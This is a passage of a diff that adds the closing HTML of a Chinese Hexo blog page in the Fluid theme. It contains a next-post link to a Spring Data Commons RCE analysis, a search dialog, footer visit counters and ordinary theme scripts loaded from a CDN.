+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/11/Spring-Data-Commons-RCE-%E5%88%86%E6%9E%90/" title="Spring Data Commons RCE 分析">
+                        <span class="hidden-mobile">Spring Data Commons RCE 分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
